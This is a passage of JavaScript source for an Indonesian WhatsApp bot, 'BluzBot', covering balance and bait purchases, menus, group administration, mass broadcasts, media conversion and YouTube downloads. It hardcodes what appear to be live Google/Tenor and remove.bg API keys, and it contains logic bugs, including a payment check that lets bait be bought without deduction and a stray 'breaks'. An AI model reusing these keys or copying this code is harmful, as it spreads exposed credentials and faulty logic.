                             if (anu < parseInt(args[1]) || !anu) return m.reply(`Balance Kamu Tidak Mencukupi Untuk Transfer Sebesar ${args[1]}, Kumpulkan Terlebih Dahulu\nKetik ${prefix}balance, untuk mengecek Balance mu!`)
                             //addCountCmd('#transfer', sender, _cmd)
                             confirmuang(sender, parseInt(args[1]))
                             adduangUser(args[0].replace('@', '')+'@s.whatsapp.net', parseInt(args[1]))
                             bluz.sendMessage(m.chat, { text: `Sukses transfer balance sebesar ${args[1]} kepada ${args[0]}`, mentions: [args[0].replace('@', '')+'@s.whatsapp.net'] })
                             break
                             case 'buyumpan':
                                case 'beliumpan':
                                         if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                                         if (!q) return m.reply(`Masukan Jumlah contoh:\n${prefix}buylimit 10\n\n*MAXIMAL PEMBELIAN UMPAN 100000000000*`)
                                         if(isNaN(parseInt(args[0]))) return m.reply('Jumlah harus berupa angka!')
                                         if ( checkuangUser(sender) <= parseInt(args[0]) * 1000) return m.reply(`maaf kak uang nya gak cukup, kumpulin uang nya dulu >_< `)
                                         if (parseInt(args[0]) > 100000000000)
                                        confirmuang(sender, parseInt(args[0] * 100))
                                        addUmpan(sender, parseInt(args[0]))
                                        sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
                                break
    //             case 'buyumpan':
    //             case 'beliumpan':
    //                     if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
    //                     if (!q) return m.reply(`Masukan Jumlah contoh:\n${prefix}buylimit 10\n\n*MAXIMAL PEMBELIAN LIMIT 10*`)
    //                     if ( checkuangUser(sender) <= yaya) return m.reply(`maaf kak uang nya gak cukup, kumpulin uang nya dulu >_< `)
    //                     if (args[0] === '1'){
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 1)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '2') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 2)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '3') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 3)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '4') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 4)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '5') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 5)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '6') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 6)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '7') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 7)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '8') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 8)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '9') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 9)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else if (args[0] === '10') {
    //     confirmuang(sender, yaya)
    //     addUmpan(sender, 10)
    //     sendButMessage (from, beliump1, beliump2, beliump3, { quoted: m}) 
    //     } else {
    //      m.reply(`Maximal pembelian limit 10 kak`)
    // }
    // break
            case 'daftar':
                    if (isRegister) return m.reply('Akun kamu sudah terdaftar di database')
                    //if (isBan) return m.reply(mess.banned)
                    if (m.isGroup) return m.reply('Daftar di private message, dengan mengetik 𝐝𝐚𝐟𝐭𝐚𝐫')
                    const serialUser = createSerial(18)
                    try {
                    ppimg = await bluz.profilePictureUrl(`${sender.split('@')[0]}@c.us`)
                    } catch {
                    ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
                    }   
                    const anuuh = `*「 𝙑𝙀𝙍𝙄𝙁𝙄𝘾𝘼𝙏𝙄𝙊𝙉 𝙎𝙐𝙆𝙎𝙀𝙎  」*
*Terimakasih telah mendapatkan diri ke database BluzBot berikut adalah infonya*\n\n*●Nama : ${pushname}*\n*●Nomor : ${sender.split('@')[0]}*\n*●Pengguna : ${register.length}*\n*●SN : ${serialUser}*\n\n*Gunakan bot sewajarnya*`
                    register.push(sender)
                    fs.writeFileSync('./database/user/register.json', JSON.stringify(register))
                    adduang(sender)
                    adduangUser(sender, 1000)
                    addlimit(sender)
                    addlimitUser(sender, 20)
                    addInventori(sender)
                    Imgnah = await getBuffer(`https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSlaKCZE6A9OdzmLHnsxL28_XT8qjBsL1tSlg&usqp=CAU`)
                    let btn886 = [{
                    urlButton: {
                    displayText: 'Donasi',
                    url: 'https://wa.me/p/4729741347132919/62895421150004'
                    }
                    }, {
                    quickReplyButton: {
                    displayText: 'MENU',
                    id: 'menu'
                    }
                    }]
                    karutamd = fs.readFileSync('./bluzmedia/image/kuda.jpg')
                    let txtit = anuuh
                    bluz.sendMessage(from, { caption: anuuh, image: Imgnah, templateButtons: btn886, footer: `© ${global.botname}`, mentions: [sender] })
                break
        case 'atm':
        case 'uang':
        case 'limit':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m})
                    const kantong = checkuangUser(sender)
                    if (isPremium) return m.reply(`┏━━━━━━━[ *ATM* ]━━━━━━━┓\n┃╭───────────────────\n┃│➸ NAMA : ${pushname}\n┃│➸ NOMOR : ${sender.split("@")[0]}\n┃│➸ UANG : ${kantong}\n┃│➸ Limit : UNLIMITED\n┃╰───────────────────\n┗━━━━━━━━━━━━━━━━━━━━┛`)
                    Anjay =`┏━━━━━━━[ *ATM* ]━━━━━━━┓\n┃╭───────────────────\n┃│➸ NAMA : ${pushname}\n┃│➸ NOMOR : ${sender.split("@")[0]}\n┃│➸ UANG : ${kantong}\n┃│➸ Limit : ${checklimitUser(sender)}\n┃╰───────────────────\n┗━━━━━━━━━━━━━━━━━━━━┛`
                    m.reply(Anjay)
                break
                case 'ppp':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) return m.reply(`Masukan Jumlah contoh:\n${prefix}buylimit 10\n\n*MAXIMAL PEMBELIAN LIMIT 10*`)
                    if (!args[1]) return m.reply(`Masukkan nominal nya!`)
                    if ( checkuangUser(sender) <= yaya) return m.reply(`maaf kak uang nya gak cukup, kumpulin uang nya dulu >_< `)
                    if (args[0] === '1'){
    confirmuang(sender, yaya)
	addlimitUser(sender, 1)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '2') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 2)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m})
	} else {
	 m.reply(`Maximal pembelian limit 10 kak`)
}
break
        case 'buylimit':
                    if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                    if (!q) return m.reply(`Masukan Jumlah contoh:\n${prefix}buylimit 10\n\n*MAXIMAL PEMBELIAN LIMIT 10*`)
                    if ( checkuangUser(sender) <= yaya) return m.reply(`maaf kak uang nya gak cukup, kumpulin uang nya dulu >_< `)
                    if (args[0] === '1'){
    confirmuang(sender, yaya)
	addlimitUser(sender, 1)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '2') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 2)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '3') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 3)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '4') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 4)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '5') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 5)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '6') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 6)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '7') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 7)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '8') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 8)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '9') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 9)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else if (args[0] === '10') {
	confirmuang(sender, yaya)
	addlimitUser(sender, 10)
	sendButMessage (from, beli1, beli2, beli3, { quoted: m}) 
	} else {
	 m.reply(`Maximal pembelian limit 10 kak`)
}
break
                case 'menu':{
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        const kantong = checkuangUser(sender)
        //var unicorn = await getBuffer('https://images.wallpaperscraft.com/image/single/deer_forest_night_130294_1600x900.jpg')
        var unicorn = fs.readFileSync('./bluzmedia/image/kuda.jpg')
        await bluz.send5ButImg(from,
`━【 ${global.botname} 】━
    
_*${ucapanWaktu} ${pushname !== undefined ? pushname : 'Kak'}*_
「𝗕𝗢𝗧 𝗜𝗡𝗙𝗢」

➤ Nama : ${pushname}
➤ Nomor : ${m.sender.split("@")[0]}
➤ Atm : ${kantong}
➤ Limit : ${isPremium ? 'UNLIMITED' : `${checklimitUser(sender)}`}
➤ User : ${register.length} Pengguna BluzBot
➤ Runtime : ${runtime(process.uptime())}
➤ Tanggal Server : *${moment.tz('Asia/Jakarta').format('DD/MM/YY')}*
➤ Waktu Server : *${moment.tz('Asia/Jakarta').format('HH:mm:ss')}*
《 ${harinye} 》
*${harinye1} Hari*, *${jamnye1} Jam*, *${menitnye1} Menit*, *${detiknye1} Detik*

✪═══✪ ⊹⊱ TOP FEATURE ⊰⊹ ✪═══✪
➤ ${prefix}sticker (reply image)
➤ ${prefix}ttnowm (link tiktok)
➤ ${prefix}igdl (link instagram)
➤ ${prefix}snobg (reply image)
➤ ${prefix}ytm3 (link youtube)
➤ ${prefix}ytm4 (link youtube)


╔═क ⊹⊱ SIMPLE BOT ⊰⊹ क═क
║
╠➤ ${prefix}allmenu
╠➤ ${prefix}convertmenu
╠➤ ${prefix}downloadmenu
╠➤ ${prefix}grupmenu
║
╚════क   ⊹⊱✫⊰⊹  क════क
` + '' + ' ', `${botname}`,unicorn )
        }
        break
                case 'allmenu':{
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
        const more = String.fromCharCode(8206)
        const readmore = more.repeat(4001)
        //var unicorn = await getBuffer('https://images.wallpaperscraft.com/image/single/deer_forest_night_130294_1600x900.jpg')
        var unicorn = fs.readFileSync('./bluzmedia/image/kuda.jpg')
        await bluz.send5ButImg(from,
`━【 ${global.botname} 】━
    
_*${ucapanWaktu} ${pushname !== undefined ? pushname : 'Kak'}*_
「𝗕𝗢𝗧 𝗜𝗡𝗙𝗢」

➤ Nama : ${pushname}
➤ Nomor : ${m.sender.split("@")[0]}
➤ Runtime : ${runtime(process.uptime())}
➤ Tanggal Server : *${moment.tz('Asia/Jakarta').format('DD/MM/YY')}*
➤ Waktu Server : *${moment.tz('Asia/Jakarta').format('HH:mm:ss')}*
《 ${harinye} 》
*${harinye1} Hari*, *${jamnye1} Jam*, *${menitnye1} Menit*, *${detiknye1} Detik*

╔═══क ⊹⊱ SIMPLE BOT ⊰⊹ क═══क
╠═══✪〘 DOWNLOAD MENU 〙
║
╠➤ ${prefix}play [judul musik]
╠➤ ${prefix}ytmp3 [link YouTube]
╠➤ ${prefix}ytmp4 [link YouTube]
╠➤ ${prefix}tiktok [link tiktok]
╠➤ ${prefix}ttnowm [link tiktok]
╠➤ ${prefix}fbdl [link Facebook]
╠➤ ${prefix}igdl [link Instagram]
║
╠═══✪〘 CONVERT MENU 〙
║
╠➤ ${prefix}autosticker [on/off]
╠➤ ${prefix}autostickerpc [on/off]
╠➤ ${prefix}emojimix 😅+😁
╠➤ ${prefix}sticker [reply gambar]
╠➤ ${prefix}stickerwm [reply gambar]
╠➤ ${prefix}snobg [reply gambar]
╠➤ ${prefix}sgif [reply video]
╠➤ ${prefix}tomp3 [reply video]
╠➤ ${prefix}tomp4 [reply stickergif]
╠➤ ${prefix}toimg [reply sticker]
╠➤ ${prefix}toaud [reply voice note]
╠➤ ${prefix}tovn [reply audio]
╠➤ ${prefix}togif [reply media]
╠➤ ${prefix}tourl [reply media]
╠➤ ${prefix}removebg [reply gambar]
║
╠═══✪〘 GRUP MENU 〙
║
╠➤ ${prefix}add 6289696090800
╠➤ ${prefix}kick 6289696090800
╠➤ ${prefix}afk [tidur]
╠➤ ${prefix}antilink [on/off]
╠➤ ${prefix}demote [tag]
╠➤ ${prefix}promote [tag]
╠➤ ${prefix}editinfo [open/close]
╠➤ ${prefix}grup [open/close]
╠➤ ${prefix}hidetag
╠➤ ${prefix}tagall
╠➤ ${prefix}totag [reply msg]
╠➤ ${prefix}setname [text]
╠➤ ${prefix}setdesc [text]
╠➤ ${prefix}setppgc [reply img]
║
╚════क   ⊹⊱✫⊰⊹  क════क
` + '' + ' ', `${botname}`,unicorn )
        }
    break
            case 'help':{
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                const more = String.fromCharCode(8206)
                const readmore = more.repeat(4001)
                //var unicorn = await getBuffer('https://images.wallpaperscraft.com/image/single/deer_forest_night_130294_1600x900.jpg')
                var unicorn = fs.readFileSync('./bluzmedia/image/kuda.jpg')
                await bluz.send5ButImg(from,
`━【 ${global.botname} 】━
            
_*${ucapanWaktu} ${pushname !== undefined ? pushname : 'Kak'}*_
「𝗕𝗢𝗧 𝗜𝗡𝗙𝗢」

➤ Nama : ${pushname}
➤ Nomor : ${m.sender.split("@")[0]}
➤ Prefix : ( ${prefix} )
➤ Tanggal Server : ${moment.tz('Asia/Jakarta').format('DD/MM/YY')}
➤ Waktu Server : ${moment.tz('Asia/Jakarta').format('HH:mm:ss')}
➤ Total Pengguna : ${register.length}
➤ Runtime : ${runtime(process.uptime())}

《 ${harinye} 》
*${harinye1} Hari*, *${jamnye1} Jam*, *${menitnye1} Menit*, *${detiknye1} Detik*
` + '' + ' ', `${botname}`,unicorn, [{"urlButton": {"displayText": "📍 GropBot","url": `https://chat.whatsapp.com/D8JYK5tBRmBIfkqXD1W9ly`}},{"urlButton": {"displayText": "🔖 Informasi","url": `https://s.id/bluzbot`}},{"quickReplyButton": {"displayText": "📑 Menu","id": 'menu'}},
{"quickReplyButton": {"displayText": "👛 Donasi","id": 'donasi'}},{"quickReplyButton": {"displayText": "🗳 Bug Report","id": 'report'}}] )
                }
    break
             case 'muteb': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                if (!isAdmins) throw mess.admin
                if (args[0] === "on") {
                if (db.data.chats[m.chat].mute) return m.reply(`Sudah Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = true
                m.reply(`${bluz.user.name} telah di mute di group ini !`)
                } else if (args[0] === "off") {
                if (!db.data.chats[m.chat].mute) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                db.data.chats[m.chat].mute = false
                m.reply(`${bluz.user.name} telah di unmute di group ini !`)
                } else {
                 let buttons = [
                        { buttonId: 'muteb on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'muteb off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await bluz.sendButtonText(m.chat, buttons, `Mute Bot`, bluz.user.name, m)
                }
             }
             break
            case 'linkgroup': case 'linkgc': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.isGroup) throw mess.group
                if (!isBotAdmins) throw mess.botAdmin
                let response = await bluz.groupInviteCode(m.chat)
                bluz.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
            }
            break
            case 'anticall': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!isCreator) throw mess.owner
                let ciko = db.data.settings[botNumber].anticall
                if (args[0] === "on") {
                if (ciko) return m.reply(`Sudah Aktif Sebelumnya`)
                ciko = true
                m.reply(`AntiCall Aktif !`)
                } else if (args[0] === "off") {
                if (!ciko) return m.reply(`Sudah Tidak Aktif Sebelumnya`)
                ciko = false
                m.reply(`AntiCall Tidak Aktif !`)
                } else {
                 let buttons = [
                        { buttonId: 'anticall on', buttonText: { displayText: 'On' }, type: 1 },
                        { buttonId: 'anticall off', buttonText: { displayText: 'Off' }, type: 1 }
                    ]
                    await bluz.sendButtonText(m.chat, buttons, `Mode AntiCall`, bluz.user.name, m)
                }
             }
             break
            case 'delete': case 'del': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!m.quoted) throw false
                let { chat, fromMe, id, isBaileys } = m.quoted
                if (!isBaileys) throw 'Pesan tersebut bukan dikirim oleh bot!'
                bluz.sendMessage(m.chat, { delete: { remoteJid: m.chat, fromMe: true, id: m.quoted.id, participant: m.quoted.sender } })
            }
            break
            case 'bcgc': case 'bcgroup': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let getGroups = await bluz.groupFetchAllParticipating()
                let groups = Object.entries(getGroups).slice(0).map(entry => entry[1])
                let anu = groups.map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Group Chat, Waktu Selesai ${anu.length * 1.5} detik`)
                for (let i of anu) {
                    await sleep(1500)
                    let btn = [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: 'https://bluztekno.blogspot.com/'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 896-9609-0800'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Bug Report',
                                    id: 'report'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      bluz.send5ButImg(i, txt, bluz.user.name, global.thumb, btn)
                    }
                m.reply(`Sukses Mengirim Broadcast Ke ${anu.length} Group`)
            }
            break
            case 'bc': case 'broadcast': case 'bcall': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isCreator) throw mess.owner
                if (!text) throw `Text mana?\n\nExample : ${prefix + command} fatih-san`
                let anu = await store.chats.all().map(v => v.id)
                m.reply(`Mengirim Broadcast Ke ${anu.length} Chat\nWaktu Selesai ${anu.length * 1.5} detik`)
		for (let yoi of anu) {
		    await sleep(1500)
		    let btn = [{
                                urlButton: {
                                    displayText: 'Website',
                                    url: 'https://bluztekno.blogspot.com/'
                                }
                            }, {
                                callButton: {
                                    displayText: 'Number Phone Owner',
                                    phoneNumber: '+62 896-9609-0800'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Status Bot',
                                    id: 'ping'
                                }
                            }, {
                                quickReplyButton: {
                                    displayText: 'Contact Owner',
                                    id: 'owner'
                                }  
                            }, {
                                quickReplyButton: {
                                    displayText: 'Bug Report',
                                    id: 'report'
                                }
                            }]
                      let txt = `「 Broadcast Bot 」\n\n${text}`
                      bluz.send5ButLoc(yoi, txt, bluz.user.name, global.thumb, btn)
		}
		m.reply('Sukses Broadcast')
            }
            break
            //[================================< CASE CONVERT >==========================]
            case 'emojimix': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isPremium && global.db.data.users[m.sender].limit < 3) return m.reply(mess.endLimit) // respon ketika limit habis
                db.data.users[m.sender].limit -= 3 // -1 limit
                try {
                    let [emoji1, emoji2] = text.split`+`
                    if (!emoji1) throw `Example : ${prefix + command} 😅+🤔`
                    if (!emoji2) throw `Example : ${prefix + command} 😅+🤔`
                    let anu = await fetchJson(`https://tenor.googleapis.com/v2/featured?key=AIzaSyAyimkuYQYF_FXVALexPuGQctUWRURdCYQ&contentfilter=high&media_filter=png_transparent&component=proactive&collection=emoji_kitchen_v5&q=${encodeURIComponent(emoji1)}_${encodeURIComponent(emoji2)}`)
                    for (let res of anu.results) {
                    let encmedia = await bluz.sendImageAsSticker(m.chat, res.url, m, { packname: global.packname, author: global.author, categories: res.tags })
                    await fs.unlinkSync(encmedia)
                }
                
            } catch {
                m.reply('Fitur emojimix Sedang Error')}
            }
                break
            case 'tomp3': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan MP3 Dengan Caption ${prefix + command}`
                m.reply(mess.wait)
            try {
                let media = await bluz.downloadMediaMessage(qmsg)
                let { toAudio } = require('./lib/converter')
                let audio = await toAudio(media, 'mp4')
                bluz.sendMessage(m.chat, {document: audio, mimetype: 'audio/mpeg', fileName: `Convert By ${bluz.user.name}.mp3`}, { quoted : m })
            } catch {
                m.reply('Fitur Tomp3 Sedang Error, Sihlakan gunakan suatu saat nanti')}
        }
            break
	        case 'tomp4': case 'tovideo': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
            try {
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await bluz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' } }, { quoted: m })
                await fs.unlinkSync(media)
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Tomp4 Sedang ERROR!'}, {quoted:m})
                m.reply('Fitur Tomp4 Sedang Error, Sihlakan gunakan suatu saat nanti')}
        }
            break
            case 'toimage': case 'toimg': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!/webp/.test(mime)) throw `Reply sticker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
            try {
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                let ran = await getRandom('.png')
                exec(`ffmpeg -i ${media} ${ran}`, (err) => {
                    fs.unlinkSync(media)
                    if (err) throw err
                    let buffer = fs.readFileSync(ran)
                    bluz.sendMessage(m.chat, { image: buffer }, { quoted: m })
                    fs.unlinkSync(ran)
                })
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Toimg Sedang ERROR!'}, {quoted:m})
                m.reply('Fitur Toimg Sedang Error, Sihlakan gunakan suatu saat nanti')}
        }
            break
            case 'toaud': case 'toaudio': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Kirim/Reply Video/Audio Yang Ingin Dijadikan Audio Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            try {
            let media = await bluz.downloadMediaMessage(qmsg)
            let { toAudio } = require('./lib/converter')
            let audio = await toAudio(media, 'mp4')
            bluz.sendMessage(m.chat, {audio: audio, mimetype: 'audio/mpeg'}, { quoted : m })
        } catch {
            bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Toaud Sedang ERROR!'}, {quoted:m})
            m.reply('Fitur Toaud Sedang Error, Sihlakan gunakan suatu saat nanti')}
    }
        break
            case 'tovn': case 'toptt': {
            if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
            if (!/video/.test(mime) && !/audio/.test(mime)) throw `Reply Video/Audio Yang Ingin Dijadikan VN Dengan Caption ${prefix + command}`
            m.reply(mess.wait)
            try {
            let media = await bluz.downloadMediaMessage(qmsg)
            let { toPTT } = require('./lib/converter')
            let audio = await toPTT(media, 'mp4')
            bluz.sendMessage(m.chat, {audio: audio, mimetype:'audio/mpeg', ptt:true }, {quoted:m})
        } catch {
            bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Tovn Sedang ERROR!'}, {quoted:m})
            m.reply('Fitur Tovn Sedang Error, Sihlakan gunakan suatu saat nanti')}
    }
        breaks
            case 'togif': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!/webp/.test(mime)) throw `Reply stiker dengan caption *${prefix + command}*`
                m.reply(mess.wait)
            try {
		        let { webp2mp4File } = require('./lib/uploader')
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                let webpToMp4 = await webp2mp4File(media)
                await bluz.sendMessage(m.chat, { video: { url: webpToMp4.result, caption: 'Convert Webp To Video' }, gifPlayback: true }, { quoted: m })
                await fs.unlinkSync(media)
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Togif Sedang ERROR!'}, {quoted:m})
                m.reply('Fitur Togif Sedang Error, Sihlakan gunakan suatu saat nanti')}
        }
            break
	        case 'tourl': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isPremium && global.db.data.users[m.sender].limit < 3) return m.reply(mess.endLimit) // respon ketika limit habis
                m.reply(mess.wait)
            try {
		let { UploadFileUgu, webp2mp4File, TelegraPh } = require('./lib/uploader')
                let media = await bluz.downloadAndSaveMediaMessage(qmsg)
                if (/image/.test(mime)) {
                    let anu = await TelegraPh(media)
                    m.reply(util.format(anu))
                } else if (!/image/.test(mime)) {
                    let anu = await UploadFileUgu(media)
                    m.reply(util.format(anu))
                }
                await fs.unlinkSync(media)
            } catch {
                bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Torul Sedang ERROR!'}, {quoted:m})
                m.reply('Fitur Tourl Sedang Error, Sihlakan gunakan suatu saat nanti')}
        }
            break
            case 'imagenobg': case 'removebg': case 'remove-bg': {
                if (!isRegister) return m.reply(mess.daftar) & sendButMessage (sender, daftar1, daftar2, daftar3, { quoted: m}) 
                if (!isPremium && global.db.data.users[m.sender].limit < 3) return m.reply(mess.endLimit) // respon ketika limit habis
                try {
	    if (!/image/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    if (/webp/.test(mime)) throw `Kirim/Reply Image Dengan Caption ${prefix + command}`
	    let remobg = require('remove.bg')
	    let apirnobg = ['q61faXzzR5zNU6cvcrwtUkRU','S258diZhcuFJooAtHTaPEn4T','5LjfCVAp4vVNYiTjq9mXJWHF','aT7ibfUsGSwFyjaPZ9eoJc61','BY63t7Vx2tS68YZFY6AJ4HHF','5Gdq1sSWSeyZzPMHqz7ENfi8','86h6d6u4AXrst4BVMD9dzdGZ','xp8pSDavAgfE5XScqXo9UKHF','dWbCoCb3TacCP93imNEcPxcL']
	    let apinobg = apirnobg[Math.floor(Math.random() * apirnobg.length)]
	    hmm = await './src/remobg-'+getRandom('')
	    localFile = await bluz.downloadAndSaveMediaMessage(qmsg, hmm)
	    outputFile = await './src/hremo-'+getRandom('.png')
	    m.reply(mess.wait)
	    remobg.removeBackgroundFromImageFile({
	      path: localFile,
	      apiKey: apinobg,
	      size: "regular",
	      type: "auto",
	      scale: "100%",
	      outputFile 
	    }).then(async result => {
	    bluz.sendMessage(m.chat, {image: fs.readFileSync(outputFile), caption: mess.success}, { quoted : m })
	    await fs.unlinkSync(localFile)
	    await fs.unlinkSync(outputFile)
	    })
    } catch {
        bluz.sendMessage('6289696090800@s.whatsapp.net', {text: 'Fitur Tiktok2 Sedang ERROR!'}, {quoted:m})
        m.reply('Fitur Tiktok Sedang Error, Sihlakan gunakan ttnowm2')}
}
    break
            //[================================< CASE DOWNLOAD >==========================]
            // MUSIK & VIDEO
        case 'ytmp4':
                    m.reply(mess.wait)
                try {
                    if (!text) return m.reply(`Masukan Link YouTube Nya\nContoh : ${prefix + command} https://youtu.be/OZbqRwLW9mA`)
                    if (!q.includes('you')) return m.reply(`Link Salah!!`)
                    let ytd = await scp.Ytd(q)
                    bluz.sendMessage(m.chat, { video: { url: ytd.url[2].url }, mimetype: 'video/mp4' }, { quoted: m })
                    await delay(5000)
                    bluz.sendImage(m.chat, ytd.thumb, `✪══✪ ⊹⊱ YouTube Downloader ⊰⊹ ✪══✪ \n\n⭔ Title : ${ytd.meta.title}\n⭔ Durasi : ${ytd.meta.duration}\n⭔ Sumber : ${ytd.meta.source}\n⭔ Link Download : ${ytd.url[1].url}`, m)
                    console.log(ytd.url[1])
                } catch (err) {
